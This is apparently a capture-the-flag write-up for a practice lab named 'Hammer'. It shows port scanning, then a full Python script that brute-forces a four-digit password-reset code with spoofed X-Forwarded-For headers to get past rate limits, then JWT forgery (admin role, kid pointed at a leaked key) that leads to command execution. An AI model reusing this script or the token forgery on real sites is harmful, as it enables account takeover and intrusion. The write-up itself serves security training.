---
description: >-
  Use your exploitation skills to bypass authentication mechanisms on a website
  and get RCE.
icon: hammer-crash
---

# Hammer

Start the VM by clicking the `Start Machine` button at the top right of the task. You can complete the challenge by connecting through a VPN or the AttackBox, which contains all the essential tools.

<figure><img src="../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

_With the Hammer in hand, can you bypass the authentication mechanisms and get RCE on the system?_



### _Q1:_ What is the flag value after logging in to the dashboard?

on rustscan i fount 2 ports that are open 22, 1337

<figure><img src="../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

when visitng then scaning that port with nmap some more results came, a http application is running&#x20;

<figure><img src="../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

I intersept the code in burp but couldn't find someting usefull,&#x20;

<figure><img src="../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

now we need to try a custom script i used this reqest to make a custom script using ai..

```python
import requests
import random
from concurrent.futures import ThreadPoolExecutor, as_completed

# Configuration variables
ip_address = "10.10.192.218"
port = "1337"
phpsessid = "pu7q3vhg08bts6ic228g4ki1bj"

# Base URL of the form submission page
url = f"http://{ip_address}:{port}/reset_password.php"

# Common headers for the request (without X-Forwarded-For)
common_headers = {
    "Host": f"{ip_address}:{port}",
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": f"http://{ip_address}:{port}",
    "DNT": "1",
    "Connection": "keep-alive",
    "Referer": f"http://{ip_address}:{port}/reset_password.php",
    "Upgrade-Insecure-Requests": "1",
    "Priority": "u=0, i",
    "Cookie": f"PHPSESSID={phpsessid}"
}

# Custom exception to exit all threads once the correct code is found
class CodeFoundException(Exception):
    pass

# Function to generate all possible 4-digit codes
def generate_codes():
    for i in range(10000):
        yield f"{i:04}"  # Format the number as a 4-digit string, e.g., "0001"

# Function to send a POST request
def send_request(code):
    # Generate a random X-Forwarded-For IP address
    x_forwarded_for = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"

    # Add the X-Forwarded-For header to the request headers
    headers = common_headers.copy()
    headers["X-Forwarded-For"] = x_forwarded_for

    # Data to be sent with the POST request
    data = {
        "recovery_code": code,
        "s": "106"  # Replace this with the correct hidden field value if necessary
    }

    try:
        # Send the POST request with the new X-Forwarded-For IP address
        response = requests.post(url, headers=headers, data=data, timeout=2)

        # Check if the recovery code is correct
        if "Invalid or expired recovery code!" not in response.text:
            print(f"Success! The correct code is: {code}")
            raise CodeFoundException
    except requests.RequestException:
        pass

    return False

# Function to run the requests in parallel using threading
def run_bruteforce():
    try:
        # Use a ThreadPoolExecutor to run multiple requests in parallel
        with ThreadPoolExecutor(max_workers=100) as executor:  # Adjust max_workers as needed
            futures = {executor.submit(send_request, code): code for code in generate_codes()}

            for future in as_completed(futures):
                future.result()  # Trigger the exception if the correct code is found
    except CodeFoundException:
        print("Correct code found, stopping execution.")
        executor.shutdown(wait=False)

if __name__ == "__main__":
    run_bruteforce()

```

Make sure add your targate ip and phpsessid

after running the python script i got the otp and reset the pass and login to the dashboard

<figure><img src="../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image_2025-07-11_16-55-21.png" alt=""><figcaption></figcaption></figure>

Below we can see there is input and we can run the cmd direct here now lets cat the flat in `/home/ubuntu/flag.txt`&#x20;

but unfortunately cat, or other cmd not working but we got some files in curr dir

<figure><img src="../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

Now, we had another folder _http://10.10.192.218:1337/vendor/firebase/php-jwt/ that means the_ key may be for the jwt token secret key\
also we can seee the jwt toekn in the page source\


<figure><img src="../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

copy the jwt token and try to manipulate the token in jwt.io

I changed few thing:\
1\. make role 'admin'\
2\. make the kid path to /html/188ade1.key which is the key that we saw\
3\. add secret key that we got \


<figure><img src="../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

Now we car run cmds that we wanted...!

<figure><img src="../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

We ran that cmd and we fount the flag., whoooooooo....!

<figure><img src="../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

Congratulation for solving the lab

Congratulations on completing the lab.....!
